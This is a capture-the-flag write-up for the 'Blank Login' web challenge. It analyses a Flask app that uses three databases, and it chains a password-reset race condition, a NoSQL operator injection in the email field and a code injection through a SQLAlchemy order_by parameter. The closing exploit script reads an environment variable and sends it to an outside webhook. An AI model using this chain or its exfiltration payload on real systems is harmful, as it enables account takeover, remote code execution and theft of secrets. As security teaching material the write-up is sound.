---
title: WWFctf2025 | Blank Login
published: 2025-07-29
description: Hm, I don't remember, probably something about three databases.
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: 17
points: 499
firstblood: false
category: WWWFctf2025
draft: false

---



## Introduction

This is the third web application I've exploited. It's a very cool challenge, not too complex, and very fun. There's a not-very-easy race condition to spot. In fact, I think that's the most difficult part. So, let's start.

We have a small Flask application with about 200 lines of code, so it's not too bad. The first page is a login page without a register page.

The first thing to do is read the code.

## Source

We can start with the set up of the flask application

```python
# filename: main.py

# Flask setup - session store
app = Flask(__name__)
app.secret_key = bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex()
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

# MongoDB setup - users
mongo_client = MongoClient("mongodb://mongo:27017/")
mongo_db = mongo_client["flaskdb"]
mongo_users = mongo_db["users"]
mongo_users.delete_many({})
admin_user = {
    "username": "admin",
    "password": bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
    "email": "admin@securepractice.corp"
}
regular_user = {
    "username": "user",
    "password": bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
    "email": "user@securepractice.corp"
}
mongo_users.insert_many([admin_user, regular_user])

# SQLite setup - audit trail
Base = declarative_base()
engine = create_engine("sqlite:///audit_log.db", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)

class SearchBase(Base):
    __tablename__ = "search_base"
    id = Column(Integer, primary_key=True)

class AuditLog(Base):
    __tablename__ = "audit_log"
    id = Column(Integer, primary_key=True)
    parent_id = Column(Integer, ForeignKey("search_base.id"))
    username = Column(String)
    action = Column(String)
    timestamp = Column(Integer)


# Other code....


if __name__ == "__main__":

    Base.metadata.create_all(bind=engine)

    # MySQL setup - reset tokens
    for _ in range(10):
        try:
            mysql_conn = mysql.connector.connect(
                host="mysql", user="root", password="rootpass", database="flaskdb"
            )
            if mysql_conn.is_connected():
                break
        except Error:
            time.sleep(3)
    if not mysql_conn:
        raise Exception("MySQL connection failed.")
    # Reset token setup
    cursor = mysql_conn.cursor(dictionary=True)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS reset_tokens (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username CHAR(255),
            token CHAR(255) DEFAULT ''
        ) CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci;
    """)
    for username in ['user', 'admin']:
        cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
        cursor.execute("INSERT INTO reset_tokens (username) VALUES (%s)", (username,))
        cursor.execute("UPDATE reset_tokens SET token = %s WHERE username = %s", (get_random_token(), username))
    mysql_conn.commit()
    cursor.close()
    mysql_conn.close()

    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
```

Okay, so analyzing the code, we have:

- Two registered a user: `user` and `admin`, with passwords that are securely and randomly generated.
- We use three databases, each with a specific purpose.
  - MySQL: Store the token for password resets.
  - Mongo: Store users
  - SQLite3: Store the audit logs.
This is a bit strange, but okay.

Now, let's look at some endpoints.

```python
#filename: main.py

# Main login page
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        if not re.fullmatch(r'^[\w@#$%^&+=!]{1,64}$', password):
            error = "Invalid password format."
        else:
            user = mongo_users.find_one({"username": username, "password": password})
            if user:
                session["email"] = user["email"]
                log_audit_event(username, "login_success")
                return redirect("/")
            log_audit_event(username, "login_failure")
            error = "Invalid credentials."
    return render_template("login.html", error=error)

# Allow users to change their email address
@app.route("/", methods=["GET", "POST"])
def me():
    if "email" not in session:
        return redirect("/login")
    current_email = session["email"]
    message = None
    if request.method == "POST":
        # Validate email
        new_email = request.get_json().get("new_email") if request.is_json else request.form.get("new_email")
        if mongo_users.find_one({"email": {"$eq": new_email}}):
            message = "That email is already in use."
        else:
            # Update email address
            result = mongo_users.update_one({"email": current_email}, {"$set": {"email": new_email}})
            if result.modified_count == 1:
                session["email"] = new_email
                message = "Email updated successfully"
            else:
                message = "Failed to update email."
    return render_template("me.html", email=session["email"], message=message)

# Administrators can view the audit logs
@app.route("/audit_logs", methods=["GET"])
def audit_logs():
    if "email" not in session:
        return redirect("/login")
    user = mongo_users.find_one({"email": session["email"]})
    if not user or user.get("username") != "admin":
        return "Access denied", 403
    order_by = request.args.get("order_by", "timestamp")
    if not any(order_by.startswith(col) for col in ['username', 'action', 'timestamp']):
        order_by = "timestamp"
    SearchBase.logs = relationship("AuditLog", order_by=f'AuditLog.{order_by}')
    db = SessionLocal()
    bases = db.query(SearchBase).all()
    logs = [log for base in bases for log in base.logs]
    db.close()
    return render_template("audit_logs.html", logs=logs)

# Users can request a new password
@app.route("/reset_request", methods=["GET", "POST"])
def reset_request():
    message = None
    if request.method == "POST":
        # Validate username
        username = request.form.get("username", "").strip()
        if not username:
            message = "Username is required."
        elif not username.isalnum():
            message = "Invalid username"
        elif 'admin' in username.lower():
            message = "Reset not allowed for admin"
        # Get user
        elif (user := mongo_users.find_one({"username": username})):
            conn = get_db()
            cursor = conn.cursor()
            try:
                # Remove all old entries
                cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
                conn.commit()
                # Create new entry
                cursor.execute("INSERT INTO reset_tokens (username) VALUES (%s)", (username,))
                conn.commit()
                # Set new token
                cursor.execute("UPDATE reset_tokens SET token = %s WHERE username = %s", (get_random_token(), username))
                conn.commit()
                message = "Reset email sent." # Backend job sends the reset email
            except:
                message = "Unhandled failure."
            finally:
                cursor.close()
        else:
            message = "User not found."
        return render_template("result.html", message=message)
    return render_template("reset_request.html")

# Users can set a new password with a valid reset token
@app.route("/reset", methods=["GET", "POST"])
def reset():
    message = None
    if request.method == "POST":
        # Validate password and token
        token = request.form.get("token", "")
        new_password = request.form.get("new_password", "")
        if not re.fullmatch(r'^[\w@#$%^&+=!]{6,64}$', new_password):
            message = "Invalid password format."
        elif not token or len(token) < 16:
            message = "Invalid token format."
        else:
            # Get user for token
            conn = get_db()
            cursor = conn.cursor(dictionary=True)
            cursor.execute("SELECT * FROM reset_tokens WHERE token = %s", (token,))
            row = cursor.fetchone()
            cursor.close()
            if row:
                # Reset user password
                username = row["username"].strip()
                mongo_users.update_one({"username": username}, {"$set": {"password": new_password}})
                cursor = conn.cursor()
                cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
                conn.commit()
                cursor.close()
                message = f"Password updated"
            else:
                message = "Invalid token."
        return render_template("result.html", message=message)
    return render_template("reset.html")
```

We have some cool endpoints:

1. `/`: Main route a route to change your email address while logged in.
2. `/login`: Pretty clear.
3. `/audit_logs`: An admin endpoint to view all audit logs.
4. `/reset_request`: Reset password request by username.
5. `/reset`: Resets the password using the username and token.

I think it's pretty straightforward, don't you?

## Solution

The first step is to search for the *flag* position. In this case, it is in an `env variable`.

```yaml
  web:
    build: .
    ports:
      - "5000:5000"
    depends_on:
      - mongo
      - mysql
    environment:
      - FLASK_ENV=production
      - FLAG=wwf{not_the_flag}
```

Okay, so the goal is to get RCE. The first thing to do is to check for SSTI, but that's not the case here.

Now, the most difficult part is checking all the code. The most suspicious things are:

1. NoSQL injection in the reset email form.

```python
new_email = request.get_json().get("new_email") if request.is_json else request.form.get("new_email")
```

The line is bad because if we pass the header JSON, it passes all the objects, not just a string.

2. It's a sort of code injection in the SQLAlchemy function in the audit logs endpoint.

```python
    if not any(order_by.startswith(col) for col in ['username', 'action', 'timestamp']):
        order_by = "timestamp"
    SearchBase.logs = relationship("AuditLog", order_by=f'AuditLog.{order_by}') # Not very good
    db = SessionLocal()
    bases = db.query(SearchBase).all()
```

Okay, nice. We have a code injection. Is that all? No, because to get access to the endpoint, we have to become an admin. We don't have a login for the user account, so it's pretty useless.

After much trial and error, I discovered a cool race condition between the `/reset_request` and `/reset` endpoints.

```python
# Users can request a new password
@app.route("/reset_request", methods=["GET", "POST"])
def reset_request():
    message = None
    if request.method == "POST":
        # Validate username
        username = request.form.get("username", "").strip()
        if not username:
            message = "Username is required."
        elif not username.isalnum():
            message = "Invalid username"
        elif 'admin' in username.lower():
            message = "Reset not allowed for admin"
        # Get user
        elif (user := mongo_users.find_one({"username": username})):
            conn = get_db()
            cursor = conn.cursor()
            try:
                # Remove all old entries
                cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
                conn.commit()
                # Create new entry
                cursor.execute("INSERT INTO reset_tokens (username) VALUES (%s)", (username,))
                conn.commit()
                # Set new token
                cursor.execute("UPDATE reset_tokens SET token = %s WHERE username = %s", (get_random_token(), username))
                conn.commit()
                message = "Reset email sent." # Backend job sends the reset email
            except:
                message = "Unhandled failure."
            finally:
                cursor.close()
        else:
            message = "User not found."
        return render_template("result.html", message=message)
    return render_template("reset_request.html")
```

When we make a reset request, the server makes three different commits, one for each query. In this case, it's very bad because there's a moment when the token is equal to an empty string. Especially, the database is set to `CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci`, so spaces are trimmed from the query.

We can basically make a `/reset` request and, at the same time, make a `/reset_request`. This allows us to change the password of ONLY the user (because the admin is blocked) and log in.

Okay, but how can we log in as an admin? Easy. Remember the NoSQLi we can use to bypass the admin check in the `/audit_logs` endpoint with a basic logic injection: `{ "$gt": ""}` (This is a possible payload.) We can inject the payload thanks to the email change.

Now, if we try to make a GET request to `/audit_logs`, we have access, and we can make the code injections.


```python
# filename: exploit.py
#!/usr/bin/python3
import random
import string
import threading
import urllib.parse
import requests

BASE_URL = "https://{instance_id}.chall.wwctf.com"
WEBHOOK_URL = "http://178.63.67.153/eb3102da-b96c-48b5-92c9-d59301574330/"

s = requests.Session()


payload_spaces = " " * 32
token_field   = urllib.parse.quote_plus(payload_spaces)
new_pass      = "cookie"

def spam_reset_request():
    while True:
        s.post(f"{BASE_URL}/reset_request",
                      data={"username": "user"},
                      timeout=3)

def race_reset():
    while True:
        data = {"token": payload_spaces, "new_password": new_pass}
        r = s.post(f"{BASE_URL}/reset", data=data, timeout=3)
        if "Password updated" in r.text:
            print("[+] Race WON!")
            break

def login():
    data = {"username": "user", "password": new_pass}
    r = s.post(f"{BASE_URL}/login", data=data)
    if "New Email" in r.text:
        print("[+] Logged in successfully!")
    else:
        print("[-] Failed to log in.")

def update_email():
    data = {"new_email":  { "$gt": "" }}
    r = s.post(f"{BASE_URL}", json=data)
    if "Email updated successfully" in r.text:
        print("[+] Email updated successfully!")
    else:
        print("[-] Failed to update email.")


def audit_logs():
    payload = f"(__import__('urllib.request', fromlist=['urlopen']).urlopen('{WEBHOOK_URL}?f='+(__import__('os').getenv('FLAG','NF'))))"
    r = s.get(f"{BASE_URL}/audit_logs",params={"order_by": f"timestamp.desc(),{payload}"})
    if "Access denied" in r.text:
        print("[-] Access denied to audit logs.")
    else:
        print("[+] Audit logs accessed successfully!")
        print(r.text)

def main():
    threading.Thread(target=spam_reset_request, daemon=True).start()
    race_reset()
    login()
    update_email()
    audit_logs()



if __name__ == "__main__":
	main()


# goodluck by @akiidjk
```

flag: :spoiler[wwf{Ju57_G1v3_mE_S0m3_5p4ce}]
